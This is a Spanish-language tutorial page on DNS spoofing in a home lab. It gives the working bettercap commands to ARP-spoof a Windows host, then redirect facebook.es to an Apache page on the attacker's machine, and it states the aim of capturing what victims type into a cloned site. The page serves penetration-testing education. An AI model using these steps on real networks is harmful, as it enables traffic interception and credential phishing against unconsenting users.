# DNS Spoofing

Con esta tecnica lo que podemos hacer es envenenar esas peticiones `DNS` de cuando alguien intenta buscar por ejemplo `www.youtube.com` y en vez de pasarlo al `Router` nos lo pasa a nosotros, pero cuando pregunte el `Router` al servidor `DNS` en el cual nosotros estaremos en medio que donde esta la IP de dicho dominio, nosotros responderemos a tal IP siendo la del web server del atacante y redirigiendole a una pagina del atacante a nuestro beneficio propio.

Por lo que el atacante podria simular una pagina identica a la de `youtube` pero que en realidad no es la legitima y es donde el usuario lo que meta, nos va a llegar a nosotros.

Primero montaremos una pagina web muy simple manualmente:

```shell
systemctl start apache2
```

```shell
cd /var/www/html
echo "<h1>Visitando la pagina web del atacante</h1>" > index.html
```

Mas adelante ya utilizaremos herramientas para crear una pagina web de forma mas profesional, pero de momento para ver el funcionamiento de esta tecnica pondremos esa pagina simple, para que se vea como se redirecciona.

Si nos vamos a donde tenemos `apache2` corriendo:

```
URL = http://localhost/
```

Podremos ver que esta todo correctamente.

<figure><img src="../../../.gitbook/assets/image (124) (1).png" alt=""><figcaption></figcaption></figure>

Primero lo que tendremos es que situarnos en medio de la comunicacion de la maquina `windows` que lo haremos mediante la tecnica del `ARP Spoofing`, cuando la maquina victima intente resolver el dominio de por ejemplo `facebook.com` nos llegara a nosotros y le responderemos con una direccion IP falsa que le lleve a la pagina que nosotros hemos creado de forma automatica.

Por lo que primero accederemos a la herramienta `bettercap`.

```shell
bettercap
```

Por lo que haremos los mismos pasos que en el `ARP Spoofing`, para simular que somos el `Router` para la maquina `windows`:

```shell
set arp.spoof.targets 192.168.5.181
```

```shell
arp.spoof on
```

Con esto lanzaremos el ataque y estaremos en mitad de esa comunicacion, si nos vamos a la maquina `windows` podremos ver con el comando `arp -a` que la direccion `MAC` es la misma que la de nuestra maquina atacante, por lo que se esta ejecutando todo correctamente.

Ahora hay que configurar el `DNS Spoofing` para que cuando busque `facebook.com` nosotros capturemos eso rapidamente y le respondamos con la direccion falsa, la IP falsa y le redirija a nuestra pagina web.

Por lo que nos iremos a nuestro `kali` y en la herramienta `bettercap` pondremos lo siguiente:

```shell
set dns.spoof.domains facebook.es
set dns.spoof.address 192.168.5.178
dns.spoof on
```

En el primer comando lo que estamos haciendo es decirle el nombre de dominio que cuando se busque nos lo cambie por nuestra pagina web automaticamente.

En el segundo comando lo que estamos haciendo es indicarle a que IP/Dominio queremos que le lleve al usuario cuando introduzca el dominio que establecimos anteriormente, en mi caso sera la IP del atacante para que le redirija al `apache2`.

Y con el tercer comando iniciamos este proceso, nos aparecera esto:

```
[01:58:43] [sys.log] [inf] dns.spoof facebook.es -> 192.168.5.178
```

Si nosotros nos vamos a la maquina `windows` y buscamos en el navegador `facebook.es` nos va a redirgir a nuestra pagina web:

<figure><img src="../../../.gitbook/assets/image (125) (1).png" alt=""><figcaption></figcaption></figure>

Y en la maquina del atacante aparecera lo siguiente:

<figure><img src="../../../.gitbook/assets/image (126) (1).png" alt=""><figcaption></figcaption></figure>

Como vemos ha funcionado correctamente.
